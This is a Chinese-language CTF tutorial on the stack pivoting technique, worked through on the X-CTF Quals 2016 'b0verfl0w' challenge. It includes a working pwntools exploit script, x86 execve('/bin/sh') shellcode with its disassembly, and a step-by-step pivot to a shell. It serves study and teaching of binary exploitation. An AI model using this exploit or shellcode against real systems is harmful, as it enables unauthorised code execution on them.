> 参考资料：[https://wiki.x10sec.org/pwn/stackoverflow/others/#stack-pivoting](https://wiki.x10sec.org/pwn/stackoverflow/others/#stack-pivoting)
>
> [https://www.cnblogs.com/17bdw/p/7898905.html](https://www.cnblogs.com/17bdw/p/7898905.html)
>

# 1、介绍
我们首先介绍一下Stack pivoting的含义：

正如它的中文意思一样，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting：

+ 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
+ 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
+ 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

此外，利用 stack pivoting 有以下几个要求

+ 可以控制程序执行流。
+ 可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是

> <font style="color:#C2185B;">pop</font> <font style="color:#3E61A2;">rsp</font><font style="color:#A61717;">/</font><font style="color:#3E61A2;">esp</font>
>

当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。

```bash
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:  pop    rbx
0x40061b <__libc_csu_init+91>:  pop    rbp
0x40061c <__libc_csu_init+92>:  pop    r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:  pop    rsp
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret
```

此外，还有更加高级的 fake frame。

+ 存在可以控制内容的内存，一般有如下
+ bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。
+ heap。但是这个需要我们能够泄露堆地址。

# 2、示例
以CTF-Wiki上的“X-CTF Quals 2016 - b0verfl0w”为例进行讲解。

> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w)
>

下载文件，检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598839836528-8c280f40-aa0d-444c-b30f-502c5ba02b10.png)

可以看到基本上没有开任何的保护，32位程序。

**<font style="color:#F5222D;">由于程序并没有开启NX保护，因此我们可以向栈上注入shellcode</font>**

运行下程序：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598839914821-cdd43974-c07d-40ce-93af-644f881b52f2.png)

什么都没有，在IDA中进行查看，来到vul函数

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598839958920-9b2c7294-114a-41b6-8a7b-d3aa391a8fdd.png)

先来测一下栈偏移，得到无效地址![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598840053650-c75667a6-a612-4636-97ca-bd9d7c87ea1f.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598840097269-4b2f3247-b6c3-4d09-a619-15913144f688.png)

测出来的栈偏移为36，也就是说输入36个字符可以覆盖到返回地址，输入32个字节可以覆盖到ebp（栈底）

我们看一下vul函数中的 fgets(&s, 50, stdin);

fgets读入了50个字符，我们能控制的大小为50-36=14个字节，emmm有点小了。

先将exp贴出来：

```python
#coding:utf8
from pwn import *
context.log_level = 'debug'

sh = process('./b0verfl0w')

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

#print shellcode_x86
sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
#print len(payload)
sh.sendline(payload)
sh.interactive()
```

脚本上来就是shellcode的内容，这是什么意思呢？我们利用python的capstone模块将字节码转换为汇编代码：

> kali自带capstone模块
>

```python
#!/usr/bin/env python
from capstone import *
#python2

shellcode_x86= ""
shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

md = Cs(CS_ARCH_X86, CS_MODE_32) #初始化类，给两个参数（硬件架构和硬件模式）
for i in md.disasm(shellcode_x86, 0x00): #disasm 反汇编这段HEX, 它的参数是shellcode和起始地址。
	print "0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str) #打印地址和操作数。
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598840903854-3b317280-1899-4ac9-9918-ffc64fdab79f.png)

其中0x68732f2f和0x6e69622f内容如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598840980038-4ecf23ad-ccef-4bb8-9faf-17acb8eff1f9.png)

mov al,0xb：其中的0xb为Linux的系统调用号：

> [https://www.yuque.com/cyberangel/rg9gdm/gvmr0g](https://www.yuque.com/cyberangel/rg9gdm/gvmr0g)
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598841229242-00fed68d-6d57-4949-81f6-c3dff53e6f86.png)

然后利用int 0x80系统中断来执行execve。

由于所能溢出的字节只有 50-0x20-4=14 个字节，所以我们很难执行一些比较好的 ROP。这里我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode 并执行。基本利用思路如下

+ 利用栈溢出布置 shellcode
+ 控制 eip 指向 shellcode处

> 我们payload的长度为44字节，其中的shellcode_x86长度为22字节，因此我们不能直接将shellcode_x86注入到栈中，否则会破环栈
>

第一步，还是比较容易地，直接读取即可，~~但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道shellcode 的地址。但是栈上相对偏移是固定的，~~所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode处，并且直接控制程序跳转至 esp处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。

我们搜索一下可以跳转到esp的gadgets：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598841621528-0d30a21a-d246-465f-8b3a-619e55916bfd.png)

其中jmp esp就是我们想要的东西，因此shellcode的布局如下：

> shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
>

其中：

> + size(shellcode+padding)=0x20
> + size(fake ebp)=0x4
> + size(0x08048504)=0x4
>

所以我们最后一段需要执行的指令就是

> <font style="color:#C2185B;">sub</font> <font style="color:#E74C3C;">0x28</font>,<font style="color:#3E61A2;">esp</font>
>
> <font style="color:#C2185B;">jmp</font> <font style="color:#3E61A2;">esp</font>
>

不明白？画个图就懂了：

![](https://cdn.nlark.com/yuque/0/2020/jpeg/574026/1598842619132-5f654770-beca-438c-97a8-4edaf44d3720.jpeg)

我们利用fgets读入payload，利用shellcode和padding（填充物）将栈填满。

当eip执行完main函数结尾的leave指令（mov esp,ebp；pop ebp），此时esp指向ret，ebp指向虚假地址bbbb。

然后执行ret指令：pop eip，eip去执行jmp的内容，eip、esp指向sub esp;jmp esp

执行结果如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598848256705-6fa7644d-c732-4f27-97f5-3f19c4ac0a48.png)

eip执行sub esp,0x28；jmp esp，执行结果如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598848608470-63e86326-f014-4d1e-9e8a-72b95f9320e5.png)

因此，程序开始执行shellcode。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598849148815-13ba9f01-e2ce-4eab-adb8-82478ead2157.png)

getshell！



